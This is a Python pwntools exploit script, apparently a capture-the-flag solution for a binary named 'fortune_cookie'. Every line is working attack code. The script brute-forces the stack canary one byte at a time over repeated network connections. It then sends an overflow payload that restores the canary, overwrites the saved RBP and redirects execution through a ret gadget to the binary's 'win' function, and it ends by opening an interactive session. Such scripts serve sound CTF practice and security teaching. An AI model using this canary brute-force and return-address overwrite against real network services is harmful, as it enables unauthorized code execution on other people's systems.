#!/usr/bin/env python3
from pwn import *

exe = ELF('./fortune_cookie')
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_CANARY = 72
OFFSET_TO_RIP    = 88   # canary + saved RBP

# ── gadgets ───────────────────────────────────────────────────────────────────
GADGET = 0x0000000000401530   # ret — stack alignment

def conn(interactive=False):
    level = 'info' if interactive else 'error'
    if args.LOCAL:
        return remote('127.0.0.1', 4444, level=level)
    return remote(HOSTNAME, PORT, level=level)

def main():
    # ── leak phase (canary brute-force) ───────────────────────────────────────
    known = b"\x00"

    for i in range(7):
        for bval in range(256):
            guess = known + bytes([bval])
            payload = b"A" * OFFSET_TO_CANARY + guess
            r = conn()
            r.recvuntil(b"wish\n")
            r.send(payload)
            try:
                data = r.recv(timeout=0.2)
            except EOFError:
                data = b""
            r.close()
            if b"OK" in data:
                known = guess
                log.success(f"byte {i+1}: {bval:#04x}")
                break

    canary = u64(known)
    log.info(f"canary = {canary:#x}")

    # ── exploit phase ─────────────────────────────────────────────────────────
    r = conn(interactive=True)
    r.recvuntil(b"wish\n")
    payload = flat(
        b"A" * OFFSET_TO_CANARY,
        p64(canary),
        b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),   # overwrite saved RBP
        p64(GADGET),
        p64(exe.sym.win),
    )
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    main()